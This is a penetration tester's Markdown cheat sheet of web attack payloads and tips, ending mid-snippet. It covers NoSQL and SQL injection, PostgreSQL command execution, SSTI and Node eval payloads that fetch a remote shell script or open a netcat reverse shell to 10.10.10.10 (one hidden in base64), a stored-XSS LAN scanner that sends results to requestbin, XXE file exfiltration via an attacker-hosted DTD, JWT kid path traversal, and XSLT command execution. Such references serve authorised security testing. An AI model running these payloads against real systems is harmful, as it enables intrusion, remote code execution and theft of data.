# üìë Technical quick hints often used

> **Note**: Use the TOC provided by the GitHub MD file rendering named `Outline`.

üè° [Back to home](README.md).

## NoSQL injection hints - MongoDB cases

### Case 1

üí° If the application construct a query using the following syntax ([source](https://blog.securelayer7.net/mongodb-security-injection-attacks-with-php/)):

```php
$USR = $_GET['username'];
$PWD = $_GET['password'];
$query = "var data = db.users.findOne({username:'$USR', password:'$PWD'}); return data;"
$data = $collection->execute($query);
//...
```

üëÄ Then I can try to detect my capability to influence the query by trying to use one of the following character `' " \ / // ; { } :` in one of the HTTP parameter in order to detect either an error or a change in the response.

### Case 2

üí° If the application construct a query using the following syntax ([source](https://blog.securelayer7.net/mongodb-security-injection-attacks-with-php/)):

*PHP*

```php
$USR = $_GET['username'];
$PWD = $_GET['password'];
$query = array("username" => $USR, "password" => $PWD);
$cursor = $collection->find($query);
//...
```

*NodeJS*

```javascript
let uname = req.body.username;
let pass = req.body.password;
let query = { 
 username: uname,
 password: pass 
}
User.find(query, function (err, user) {/* ... */});
```

üëÄ Then I can try to detect my capability to influence the query by using [query and projection operators](https://docs.mongodb.com/manual/reference/operator/query/) expression on the HTTP parameter like this:

üìç It must be adapted to the target platform dealing with the MongoDB!

*Example for PHP*

```php
// $eq: Matches values that are equal to a specified value.
// $ne: Matches all values that are not equal to a specified value.
// Here check if I can influence the query and check if a user "admin" exists with a password different from "test"
username[$eq]=admin&password[$ne]=test
// $regex: Selects documents where values match a specified regular expression.
// Here check if I can influence the query and check if there is a user with a username 
// starting with the letter "a" with a password different from "yololo"
// The following regex can be used to identify the item with the maximum length (here testing max length to 5): ^.{5}$
username[$regex]=^a.*&password[$ne]=yololo
```

*Same example but for NodeJS where JSON is sent in request body*

```javascript
{"username":{"$eq":"admin"},"password":{"$ne":"test"}}

{"username":{"$regex":"^a.*"},"password":{"$ne":"yololo"}}
```

## SQL injection hints - Identify query building via string concatenation in code base

Search for the following patterns:

```shell
# Replace the "\+" by the string concatenation character for the target technology
$ grep -Ernwi --color "(SELECT|INSERT|UPDATE|DELETE|ORDER).*?\+.*?" *
```

## SQL injection hints - PostgreSQL hints

* Two dollar characters (`$$`) can be used as a quote (`'`).
* Single dollar (`$`) can indicate the beginning of a **tag**. The tag is optional, can contain zero or more characters, and is terminated with a matching dollar (`$`). A closing tag is required to finalize the string.

Example:

```sql
SELECT 'TEST';
SELECT $$TEST$$;
SELECT $TAG$TEST$TAG$;
```

## SQL injection hints - PostgreSQL system command execution via a SQLI

ü§î System command execution can be achieved via a [User Defined Function](https://www.postgresql.org/docs/current/xfunc.html) associated to a custom library (see this [code](../scripts/pg_cmdexec_extension.c) to compile for the target OS and version of PostgreSQL targeted).

For Windows, `system()` vs `ShellExecute()` usage for command execution:

* `system()` can be used on Windows too but it hang until the command executed is finished.
* `ShellExecute()` execute the command and continue without waiting that the command finish.

Follow these steps:

> Daily build of the extension for Linux 64 bits for several versions of PostgreSQL are provided [here](https://github.com/righettod/toolbox-pentest-web/actions?query=workflow%3A%22Build+PostgreSQL+extension%22).

1. Get the version of the DB and OS via the following query:

```sql
SELECT version();
```

2. For Windows install the headers files during the PG installation - For Linux install the following packages:

```shell
# For "postgresql-server-dev-10" install the version matching the version of PostgreSQL targeted
# based on information from the "SELECT version();" query
$ sudo apt install postgresql postgresql-server-dev-10 gcc
```

3. For Windows see [here](https://wiki.postgresql.org/wiki/Building_and_Installing_PostgreSQL_Extension_Modules#Windows_with_Microsoft_Visual_Studio) - For Linux use the following commands to compile the extension:

```shell
$ which pg_config
/usr/bin/pg_config
$ gcc -I$(/usr/bin/pg_config --includedir-server) -shared -fPIC -o pg_cmdexec_extension.so pg_cmdexec_extension.c
$ file pg_cmdexec_extension.so
pg_cmdexec_extension.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked
```

4. Use this [script](../scripts/pg_cmdexec_via_lob.py) to load and use the library via an UDF in order to execute system commands via an SQLI (blind or not).

## Disable TLS warnings in the requests python module

```python
import requests
# Disable TLS warning when validation is disabled when requests is used
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
# Configure proxy to debug request sent using requests and disable validation of the TLS certificate
proxies = { "http" : "http://127.0.0.1:8080", "https" : "http://127.0.0.1:8080" }
response = requests.get("https://target.com", verify=False, proxies=proxies)
```

## JavaScript Fetch API tips

* [Documentation](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API).
* [Credentials clause documentation](https://developer.mozilla.org/en-US/docs/Web/API/Request/credentials).

### Upload a file

```javascript
//Embeed the file as a blob
var filename = "file.tar.gz";
var fileEncodedInB64 = "...";
//See "https://stackoverflow.com/a/16245768" for the B64 to binary blob handling
var byteCharacters = atob(fileEncodedInB64);
var byteNumbers = new Array(byteCharacters.length);
for (i = 0; i < byteCharacters.length; i++) {
    byteNumbers[i] = byteCharacters.charCodeAt(i);
}
var byteArray = new Uint8Array(byteNumbers);
var fileBlob = new Blob([byteArray], {type: "application/x-compressed-tar"});
//Upload the file
var formData  = new FormData();
formData.append("file", fileBlob, filename);
fetch("/upload ", { credentials: "include", "method": "POST", body: formData})
 .then(response => response.text())
 .then((body) => { /* Do something with the body text content */ });
```

### Post a form

```javascript
var formData  = new FormData();
formData.append("login", login);
formData.append("password", password);
fetch("/login", { credentials: "omit", "method": "POST", body: formData})
 //See https://developer.mozilla.org/en-US/docs/Web/API/Body/text
 //See https://developer.mozilla.org/en-US/docs/Web/API/Body/json
 .then(response => response.text()) 
 .then((body) => {  /* Do something with the body text content */ });
```

### Deal with HTTP 30x

```javascript
var formData = new FormData();
formData.append("login", login);
formData.append("password", password);
fetch("/login", { credentials: "include", "method": "POST", body: formData })
 .then(response => {
  //If "response.redirected" is true then an HTTP 30x was received
  //See https://developer.mozilla.org/en-US/docs/Web/API/Response/redirected
  if (response.redirected) { /* Do something */ }
 });
```

## SSTI tips

üìç The first step is to identify the syntax for the **Expression** and **Statement** for the targeted template engine in place. This [fuzzing dictionary](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-expression.txt) can help.

### Python with Jinja

**Statements** and **Expressions** combinations allowing execution of command and bypassing some filters that check for forbiden characters like "_":

```jinja
{# Define the character underscore without writing it statically #}
{% set marker = "%c" % 95 %}

{# Define an entry point object instance to search in the execution context #}
{% set string = "x" %}

{# Build the names of objects without using the underscore explicitly #}
{% set class = marker[0] + marker[0] + "class" + marker[0] + marker[0] %}
{% set mro = marker[0] + marker[0] + "mro" + marker[0] + marker[0] %}
{% set subclasses = marker[0] + marker[0] + "subclasses" + marker[0] + marker[0] %}

{# Access to the MRO of the entry point object instance and then loaded sub classes in the current execution context #}
{% set mro_r = string|attr(class)|attr(mro) %}
{% set subclasses_r = mro_r[1]|attr(subclasses)() %}

{# Dynamically find the index of the class "subprocess.Popen" in the current execution context #}
{% set size = subclasses_r|length %}
{% set index = -1 %}
{% for i in range(size) %}
 {# value for "class_name" is like "<class 'subprocess.popen'>" #}
 {% set class_name = subclasses_r[loop.index]|string|lower|safe %}
 {# value for class_name_short is like "subprocess.popen" #}
 {% set class_name_short = class_name.split("'")[1] %}
 {# Check current class #}
 {% if class_name_short == "subprocess.popen" and index == -1 %}
  {% set index = loop.index %}
  {% set subclass = subclasses_r[index] %}
  CLASS:
  Index: {{ index }}
  Class: {{subclass|forceescape}}
  {# Value for PIPE was obtained by reading the source code of the class subprocess #}
  {% set pipe = -1 %}
  {# Trigger the execution of the wanted command #}
  {% set p = subclass (["/bin/wget", "10.10.10.10/rs.sh"], stdout=pipe, stderr=pipe) %}
  {# Access to the execution output #}
  EXEC STDOUT:
  {{ p.stdout.read() }}
  EXEC STDERR:
  {{ p.stderr.read() }}
 {% endif %}
{% endfor %}
```

### NodeJS via Express with Pug

ü§î Interesting objects to inspect via a template **Expression**:

```javascript
#{this}
#{Object.keys(this)}
#{Object.keys(global)}
#{Object.keys(process)}
```

üíª **Expression** allowing execution of command and bypassing some filters:

```javascript
/*
cj1wcm9jZXNzLm1haW5Nb2R1bGUuY29uc3RydWN0b3IuX2xvYWQ7cigiY2hpbGRfcHJvY2VzcyIpLmV4ZWMoImN1cmwgMTAuMTAuMTAuMTAvcnMuc2ggfCAvYmluL2Jhc2giKTs=

Once Base64 decoded is

r=process.mainModule.constructor._load;r("child_process").exec("curl 10.10.10.10/rs.sh | /bin/bash");
*/
=eval(new Buffer("cj1wcm9jZXNzLm1haW5Nb2R1bGUuY29uc3RydWN0b3IuX2xvYWQ7cigiY2hpbGRfcHJvY2VzcyIpLmV4ZWMoImN1cmwgMTAuMTAuMTAuMTAvcnMuc2ggfCAvYmluL2Jhc2giKTs=",'base64').toString('ascii'))
```

### NodeJS when a feature use user provided code in the eval() function

üíª **Code** allowing execution of command and bypassing some filters by defining a custom limited execution context. Here `[ExternalObjectReferencePassed]` refer to an object reference passed from the external context to the custom execution context created:

```javascript
(function test(){var p=[ExternalObjectReferencePassed].constructor.constructor('return process')();var require=p.mainModule.require;var cp=require('child_process'); var c='nc 10.10.10.10 9100 -e \\\\x2fbin\\\\x2fbash'; cp.exec(c); return 1;})()
```

## JavaScript general payloads and tips

### Define a Web Messaging global message listener

* [Documentation about Events](https://developer.mozilla.org/en-US/docs/Web/Events).
* [Documentation about EventListener](https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/addEventListener).

üíª The following code add a listener that is triggered for any message received from a child (i)frame or a parent window:

```html
<script>
    //"message": A message is received from a child (i)frame or a parent window.
    //Data sent is: parent.postMessage({type: "yolo", mydata: "xxx"}, "*");
    window.addEventListener("message", function(e) {
        console.log(JSON.stringify(e.data));
        console.log("Data received: " + e.data.mydata);
    }, false)
</script> 
```

### Find a target in a LAN via a stored XSS

```html
<!DOCTYPE html>
<html>
<head>
    <title>POC</title>
</head>
<body>
<!--
This POC is a work to find a use case of the following tips:
    https://twitter.com/PortSwiggerRes/status/1346848979263381506

The use case found is the following:
    You have a XSS Stored vulnerability in a application that have 2 areas: One for external users (ex: customers) and 
    One for internal operators (ex: employees).
    
    The insertion point is located in a feature exposed to external users and the XSS is located in a feature exposed 
    to the internal operators using data from externals users areas.
    
    So you are able to execute the JS code in the browsing context + network context of a internal operator.
    
    The goal is to leverage this opportunity to discover and reach internal application in a blind way due
    to network position.

Hypothesis:
    Assume here that we achieve to identify at least one internal IP address
-->
</body>
    <script>
        //POC: Search for the presence of a ManageEngine product on the network where the internal operator is located 
        //https://github.com/danielmiessler/SecLists/pull/517*/
        
        console.info("Start test at " + new Date());

        const searchedFile = "http://IP_ADDRESS:8090/servlet/GetProductVersion";
        const baseIpPrefix = "192.168.178.";//The IP that we have identified is 192.168.178.38
        const loadMaxDelay = 1000;
        const ifr = document.createElement("iframe");
        let currentHostAddr = 30;//Test range 192.168.178.30-40

        //Function handling the case when connection cannot be established
        //by verifying if the test has moved forward or if it is still on the current tested host
        //because "OnError" event is not triggered when connection cannot be established
        function checkLoading(hostAddressTargeted){
            if(currentHostAddr === hostAddressTargeted){
                moveNext(false);
            }
        }

        //Function handling the progress across the different host IP addresses 
        function moveNext(endpointFound){
            //Verify if the loading succeed for the tested host
            if(endpointFound && ifr.src.endsWith("/servlet/GetProductVersion")){
                let ip = baseIpPrefix + currentHostAddr;
                console.warn("Endpoint found on IP: " + ip);
                //Exfiltrate the info using JS
                fetch("http://requestbin.net/r/1njt54v1?ip=" + ip);
            }
            //Move forward
            currentHostAddr++;
            if(currentHostAddr <= 40){
                //Pass to the next host
                ifr.src = searchedFile.replace("IP_ADDRESS", baseIpPrefix + currentHostAddr);
                //Set loading timeout check
                setTimeout(function(){ checkLoading(currentHostAddr) }, loadMaxDelay);
            }else{
                console.info("Finised test at " + new Date());
            }
        }

        //Configure the Iframe, define event handlers on the it to move the test forward and add it to the DOM
        ifr.style.display = "none";
        ifr.sandbox = "";//To speed-us the loading
        ifr.onload = function() { moveNext(true); }; 
        ifr.onerror = function() { moveNext(false); };//Event not triggered when connection cannot be established
        document.body.appendChild(ifr);

        //Made the first run
        ifr.src = searchedFile.replace("IP_ADDRESS", baseIpPrefix + currentHostAddr);
        setTimeout(function(){ checkLoading(currentHostAddr) }, loadMaxDelay);
    </script>
</html> 
```

üíª Execution example:

![Find_Target_In_Lan_Via_Stored_XSS](Find_Target_In_Lan_Via_Stored_XSS.png)

### JS array methods cheatsheet

* [Code samples](https://gist.github.com/rauschma/6cdeb4af7586aa03baed2f925e0a084b).

![JS array methods cheatsheet](JS_array_methods.jpg)

### XSS via SVG

* [Documentation](http://ghostlulz.com/xss-svg/).
* [Documentation](https://research.securitum.com/do-you-allow-to-load-svg-files-you-have-xss/).

üíª Payload example:

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
   <script type="text/javascript">
  var formData  = new FormData();
  formData.append("xxx", "xxx");
  formData.append("yyy", "yyy");
  fetch("/endpoint", { credentials: "include", "method": "POST", body: formData, headers: new Headers({"X-Requested-With": "XMLHttpRequest"})})
   .then(response => response.text()) 
   .then((body) => { alert("Triggered!") });
   </script>
</svg>
```

## Identify gRPC services via reflection

> Another way is described in this [file](BroBox_WriteUp.pdf) if reflection is not enabled.

üíª The tool [grpcurl](https://github.com/fullstorydev/grpcurl) will be used for this operation.

```shell
# List available services exposed on host "my-target:443"
$ grpcurl my-target:443 list
grpc.reflection.v1alpha.ServerReflection
identity.Auth

# List available methods for the service named "identity.Auth" 
$ grpcurl my-target:443 list identity.Auth
identity.Auth.GetSalt
identity.Auth.GetUser
identity.Auth.GetUsers

# Get the signature of the method named "identity.Auth.GetUsers"
$ grpcurl my-target:443 describe identity.Auth.GetUsers
identity.Auth.GetUsers is a method:
rpc GetUsers ( .identity.UsersRequest ) returns ( stream .identity.UserReply );

# Get the structure of the parameter named ".identity.UsersRequest"
$ grpcurl my-target:443 describe .identity.UsersRequest
identity.UsersRequest is a message:
message UsersRequest {
  int32 limit = 1;
}
```

## Audit JWT token

> **Note**: This [toolbox](https://github.com/righettod/toolbox-jwt) can be used to generate **derivated RSA/ECDSA public keys** depending on the type key use by the targeted JWT token and apply the [TICARPI](https://github.com/ticarpi/jwt_tool) attack playbook.

> üìë JWT claims [complete list](https://www.iana.org/assignments/jwt/jwt.xml).

üìç Update the following keys in the file `jwtconf.ini` of the TICARPI tool:

* **httplistener**: Set the burp collaborator url.
* **jwksloc**: Set the burp collaborator url and suffix `/jwks.json`.
* **proxy**: Set the burp proxy information.

Example of the result in the expected section:

```ini
[services]
jwt_tool_version = 2.2.2
# To disable the proxy option set this value to: False (no quotes)
# proxy = localhost:8080
proxy = False
# Set this to the URL you are hosting your custom JWKS file (jwttool_custom_jwks.json) - your own server,
# or maybe use this cheeky reflective URL
jwksloc = https://[ID].burpcollaborator.net/jwks.json
# Set this to the base URL of a Collaborator server, somewhere you can read live logs, a Request Bin etc.
httplistener = https://[ID].burpcollaborator.net
```

üíª Command line to apply the complete playbook against a verification service that will be used as "oracle" to check if the token is accepted or not after a mutation:

```bash
python3 jwt_tool.py -t "https://app.com/token-validation-service" -M at -cv "STRING_PRESENT_IF_TOKEN_IS_ACCEPTED" -rh "Authorization: Bearer eyJhbGciOiJIU..."
```

> **Warning**

üí° In addition, the exposure to a signature abuse via a path traversal on the **kid** claim must be manually tested because [is not currently supported](https://github.com/ticarpi/jwt_tool/issues/71) by the TICARPI tool:

* Technical description in section named **[Injecting self-signed JWTs via the kid parameter](https://portswigger.net/web-security/jwt)** of the JWT PortSwigger WebAcademy course.
* [Demonstration video](JWT_KID_Path_Traversal.mp4).
* Used [JWT Burp extension](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd).

üíª JWT token **header** section to use:

```json
{
    "kid": "../../../../../../../../../../../dev/null",
    "typ": "JWT",
    "alg": "HS256",
    "k": "AA=="
}
```

> **Warning**

üìç In addition, the exposure to a signature abuse via the **[deriving public keys from existing tokens](https://portswigger.net/web-security/jwt/algorithm-confusion)** technique described in the [JWT PortSwigger WebAcademy course](https://portswigger.net/web-security/jwt) must be manually tested because is not supported by the TICARPI tool.

## Extract services information from OpenAPI document via JQ

> **Note**: This section provide hints about how to extract services from a [OpenAPI document](https://swagger.io/specification/) (Swagger) via [JQ](https://stedolan.github.io/jq/manual/).

* [OpenAPI online viewer as mind map](http://openapi-map.apihandyman.io/).
* [JQ expressions for OpenAPI blog post](https://apihandyman.io/api-toolbox-jq-and-openapi-part-1-using-jq-to-extract-data-from-openapi-files/).
* [Collection of JQ filter files from OpenAPI document](https://github.com/arno-di-loreto/jq-and-openapi).

üíª JQ call syntax to use *filter file* against a OpenAPI (Swagger) file:

```shell
# Syntax: 
# jq -r -f [FILTER_JQ_FILE] [SWAGGER_JSON_FILE]
$ jq -r -f list-operations.jq swagger.json
```

üíª  JQ filter to list all operations ([source](https://github.com/arno-di-loreto/jq-and-openapi/blob/part-1/list-operations.jq)) - File name `list-operations.jq`, an adapted copy of the file `list-operations.jq` is stored [here](../scripts/list-operations.jq).

```jq
# 1 - Selects paths objects
#--------------------------
# returns [{key: path, value: path value}]
.paths # Selects the paths property content
| to_entries # Transforms
             # { "/resources": { "get": {operation data}}} 
             # to 
             # [ { "key": "/resources", 
             #     "value": { "get": {operation data}} ]
| map(select(.key | test("^x-") | not)) # Gets rid of x-tensions
# 2 - Creates an array of operations
#-----------------------------------
# returns [{path, method, summary, deprecated}]
| map ( # Applies a transformation to each element
  .key as $path # Stores the path value (.key) 
                  # in a variable ($path) for later use
  | .value # Keeps only the path's content 
           # { "get": {operation data}}
  | to_entries # Transforms 
               # { "get": {operation data}}
               # to
               # [ { "key": "get", 
               #     "value": {operation data}} ]
  | map( # Applies a transformation to each element
    select( # Keeps only elements for which the following is true
      # With IN, which returns true if the value is one of its
      # parameters, we can get rid of x- , parameters
      # description and summary properties
      .key | IN("get", "put", "post", "delete", 
         "options", "head", "patch", "trace")
    )
    | # Creates a new JSON object
    {
      method: .key,
      path: $path, # Using the variable defined on line 4
      summary: .value.summary?,
      deprecated: .value.deprecated?
    }
  )[] # Flattens array to avoid having an array 
      # of array of {path, method, summary, deprecated}
) # Now we have an array of {path, method, summary, deprecated}
# 3 - Outputs tab separated raw text
#-----------------------------------
| map( # Applies a transformation to each element
  .method + "\t" + 
  .path + "\t" + 
  .summary + 
  (if .deprecated then " (deprecated)" else "" end)
)
[] # Flattens array for raw output
```

üí° This [script](../scripts/identify-services-from-openapi-descriptor.sh) can be used to list the services using the technics mentioned above.

## Identify credentials in a folder or git repository

> The tool [GitLeaks](https://github.com/zricethezav/gitleaks) will be used (cross-platform and portable).

:information_source: Call options are available [here](https://github.com/zricethezav/gitleaks#usage-and-options).

:information_source: A complete patterns file is available [here](https://github.com/zricethezav/gitleaks/blob/master/config/gitleaks.toml).

:information_source: Custom configuration file with detection patterns is available [here](../scripts/gitleaks-custom-config.toml).

:information_source: This [custom script](../scripts/generate-report-gitleaks.py) can be used to get a quick leaks report from a gitleaks scan.

:information_source: This [custom script](../scripts/identify-pattern-in-git-repo-logs.sh) can be used to search for credentials in commit logs message.

üí° Additional patterns are available [here](https://docs.gitguardian.com/secrets-detection/detectors/supported_credentials).

üíª Command lines to run:

```powershell
# Search for credentials in the commits history
PS> gitleaks.exe -p [GIT_REPO_CLONE_FULL_PATH] -c gitleaks-custom-config.toml -v
...
# Search for credentials in the folder and assume that is not a git repository (git files are ignored)
PS> gitleaks.exe -p [FOLDER_FUL_PATH] -c gitleaks-custom-config.toml --no-git -v
...
# Search for credentials, generate a JSON report and extract leaks identified with JQ
PS> gitleaks.exe -p [GIT_REPO_CLONE_FULL_PATH] -c gitleaks-custom-config.toml -o report.json
PS> Get-Content -Path .\report.json | jq -r ".[].line"
...
# For the 2 following commands, place the file "gitleaks-custom-config.toml" inside the git clone repository folder
# because GitLeaks "-c" parameter did not like the "\" character used for relative path.
# Search for credentials in commits history of all branches
# Run this command inside the git clone repository folder
PS> git branch | ForEach-Object{ $b=$_.toString().Trim().Replace("* ",""); Write-Host "[+] Branch: $b" -ForegroundColor Cyan; gitleaks.exe -p $pwd -v -c gitleaks-custom-config.toml --branch="$b" }
# Search for credentials in the files of all branches (by checkout the branch actual content) ignoring commits history
# Run this command inside the git clone repository folder
PS> git branch | ForEach-Object{ $b=$_.toString().Trim().Replace("* ",""); Write-Host "[+] Branch: $b" -ForegroundColor Cyan; git checkout $b;
 gitleaks.exe -p $pwd -v -c gitleaks-custom-config.toml --no-git }
...
```

üëÄ Another location to check for credentials can be the repository metadata itself, see [here](https://www.notgitbleed.com/) for details.

üíª The following shell command can be used from a git repository root folder:

```bash
$ git log | grep Author | grep -v @
...
```

## XXE and DTD payloads

* [Documentation about usage of XInclude](https://portswigger.net/web-security/xxe).
* [Documentation about usage of blind XXE](https://portswigger.net/web-security/xxe/blind).
* [Write-up about misconfigurations in Java XML Parsers](http://immunityservices.blogspot.com/2021/02/misconfigurations-in-java-xml-parsers.html).

### Local file read via XXE

```xml
<!DOCTYPE data [ <!ENTITY xxe SYSTEM "file://[FILE_FULL_PATH]"> ]>
```

### Remote file read via XXE

> **Note**: Can be used for port or host scan.

```xml
<!DOCTYPE data [ <!ENTITY xxe SYSTEM "https://[DOMAIN:PORT]/[PATH]"> ]>
```

### SSRF or port/host scanning via DTD

:bulb: For a scanning operation, if external entities are not resolved, external DTD location via the **SYSTEM identifier** can be tried via the following payload and checking of the response time delay for variation:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE mydtd SYSTEM "https://[DOMAIN:PORT]/[PATH]">
<data />
```

:bulb: Same idea using the **PUBLIC identifier**:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test PUBLIC "-//W3C//DTD HTML 4.01//EN" "https://[DOMAIN:PORT]/[PATH]">
<data />
```

### XXE via XInclude

```xml
<data xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="text" href="file://[FILE_FULL_PATH]"/>
</data>
```

### Retrieve data via error message

> **Note**: **From Portswigger XXE course:** "An alternative approach to exploiting blind XXE is to trigger an XML parsing error where the error message contains the sensitive data that you wish to retrieve. This will be effective *if the application returns the resulting error message within its response*."

```xml
<!ENTITY % file SYSTEM "file://[WANTED_FILE_FULL_PATH]">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error; 
```

### Exfiltrate XML content

#### When target file contains a singe line

üíª DTD version of the main payload:

```xml
<!DOCTYPE mydtd SYSTEM "http://10.10.10.10/wrapper.dtd">
```

üíª XXE version of the main payload:

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://10.10.10.10/wrapper.dtd"> %xxe;]>
```

üíª File *wrapper.dtd*:

```xml
<!ENTITY % file SYSTEM "file:///[FILE_FULL_PATH]">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://10.10.10.10/?x=%file;'>">
%eval;
%exfiltrate;
```

#### When target file contains multiple lines

üíª XXE main payload:

```xml
<!DOCTYPE data [
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "file:///[FILE_FULL_PATH]">
<!ENTITY % end "]]>">
<!ENTITY % xxe SYSTEM "http://10.10.10.10/wrapper.dtd">
%xxe;
]>
```

üíª File *wrapper.dtd*:

```xml
<!ENTITY wrapper "%start;%file;%end;">
```

## Password identify hashcat patterns

> **Note**: The tool [maskcat](https://github.com/JakeWnuk/maskcat) can be used to achieve such objective.

```bash
# go install github.com/jakewnuk/maskcat@latest
$ echo 'HelpDesk2023$' | maskcat
?u?l?l?l?u?l?l?l?d?d?d?d?s:13:4:281
```

## Password derivation from a base

> **Note**: The [RSMangler](https://github.com/digininja/RSMangler) and [psudohash](https://github.com/t3l3machus/psudohash) scripts can be used and are both installed on the toolbox.

> **Warning**: Usage of advanced derivation options for [psudohash](https://github.com/t3l3machus/psudohash) cause the generation to take a while and consume huge disk spaces.

```bash
# Using RSMangler
$ echo "MyPasswordBase" | /tools/password-mangler/rsmangler.rb --file - --min 1 --max 20 --output /tmp/passlist.txt
# Using psudohash
$ current_year=$(date +"%Y")
$ python3 /tools/password-derivation/psudohash.py -q -w "MyPasswordBase" --append-numbering 1 --numbering-limit 10 --years "2020-$current_year" --output /tmp/passlist.txt
$ python3 /tools/password-derivation/psudohash.py -q -w "MyPasswordBase" --common-paddings-before --common-paddings-after --output /tmp/passlist.txt
$ head -5 /tmp/passlist.txt
...
```

## Weak key pairs for testing purpose

üíª The following utility site can be used:

* [RSA key pair from 512 to 4096 bits](https://travistidwell.com/jsencrypt/demo/).
* [RSA key pair from 512 to 4096 bits](https://8gwifi.org/RSAFunctionality?keysize=512) (alternative).
* [EC key pair](https://8gwifi.org/ecsignverify.jsp).
* [SSH key pair using RSA/DSA/ECDSA algorithm with weak key size](https://8gwifi.org/sshfunctions.jsp).
* [JSON Web Key generator with specified key size](https://mkjwk.org/).

## Generate a custom dictionary of payloads

> **Note**: The tool [gorilla](https://github.com/d4rckh/gorilla), installed on the box, will be used.

* [Documentation](https://github.com/d4rckh/gorilla).

```bash
# Generate an empty file to receive all the generated payloads
$ touch /tmp/dico.txt
# Generate a dictionary with payloads following the patterns: [a-z]{5}
$ /tools/wordlist-generator/target/release/gorilla --from-pattern "{a-z}{a-z}{a-z}{a-z}{a-z}" --output-file /tmp/dico.txt
gorilla: (warning) missing mutation sets
gorilla: using file /tmp/dico.txt as output
gorilla: will generate 11881376 words from a pattern {a-z}{a-z}{a-z}{a-z}{a-z}
         sizes before mutations: 71288256 bytes / 67 MB / 0 GB / 0 TB
gorilla: finished in 12.8689854s. 11881376 words -> 11881376 words
```

## JavaScript HTTP call interception

> **Note**: The library [XHook](https://github.com/jpillora/xhook) will be used.

> üí° The library [XDomain](https://github.com/jpillora/xdomain), a pure JavaScript CORS alternative, can be usefull too.

‚ö†Ô∏è It's important to include **XHook** first as other libraries may store a reference to **XMLHttpRequest** before XHook can patch it.

üíª Code snippet showing usage:

```html
<!DOCTYPE html>
<html>
 <head>
  <title>Test</title>
  <!-- Add Subresource Integrity hash if used in prod app -->
  <!-- https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity -->
  <script src="//unpkg.com/xhook@latest/dist/xhook.min.js"></script>
  <script>
    //Hook to alter the request before it was sent by the browser
    xhook.before(function(request) { console.log(`[BEFORE] Call to ${request.url}`); });
    //Hook to alter the response before it was passed to the caller
    xhook.after(function(request, response) { console.log(`[AFTER ] Call to ${request.url}`); });
  </script>  
 </head>
 <body>
  <script>
   fetch("https://cors-test.appspot.com/test").then((data) => console.log(data));
  </script>
 </body>
</html> 
```

## XSLT tips

### Read local file

üí° The XSLT **[document](https://www.w3schools.com/xml/func_document.asp)** function will be leveraged. This function is used to access nodes in an external XML document but can be used to read other content when the parsing error are displayed.

üíª Code snippet showing usage:

```xsl
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">
        <html>
            <body>
                <!-- Example 1 -->
                <xsl:value-of select="document('file:///etc/passwd')" />
                <!-- Example 2 -->
                <xsl:copy-of select="document('file:///var/www/index.php')"/>
            </body>
        </html>
    </xsl:template>
</xsl:stylesheet>
```

### Obtain information about the XSLT engine used

* [Documentation](https://blog.hunniccyber.com/ektron-cms-remote-code-execution-xslt-transform-injection-java/)

üíª Code snippets showing usage:

```xsl
<?xml version="1.0"?>
<xsl:stylesheet version="2.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">
Version: <xsl:value-of select="system-property('xsl:version')" />
Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
    </xsl:template>
</xsl:stylesheet>
```

### Execute system command via Java Xalan library

* [Documentation](https://www.agarri.fr/blog/archives/2012/07/02/from_xslt_code_execution_to_meterpreter_shells/index.html)
* [Set of payloads 1](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSLT%20Injection/README.md)

üíª Code snippets showing usage:

```xsl
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
    xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
    <xsl:template match="/">
        <xsl:variable name="rtobject" select="rt:getRuntime()"/>
        <xsl:variable name="process" select="rt:exec($rtobject,'whoami')"/>
        <xsl:variable name="processString" select="ob:toString($process)"/>
        <xsl:value-of select="$processString"/>
    </xsl:template>
</xsl:stylesheet>
```

üí° Documentation for the [Java Saxon library](https://blog.hunniccyber.com/ektron-cms-remote-code-execution-xslt-transform-injection-java/).

### Execute PHP registered functions

* [Documentation](https://www.php.net/manual/en/xsltprocessor.registerphpfunctions.php)
* [Set of payloads 1](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSLT%20Injection/README.md)
* [Set of payloads 2](https://security.stackexchange.com/a/171424)

üíª Code snippets showing usage:

```xsl
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:php="http://php.net/xsl" xsl:extension-element-prefixes="php">
    <xsl:template match="/">
        <html>
            <body>
                <xsl:value-of select="php:function('shell_exec','ls -l')" />
            </body>
        </html>
    </xsl:template>
</xsl:stylesheet>
```

```xsl
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
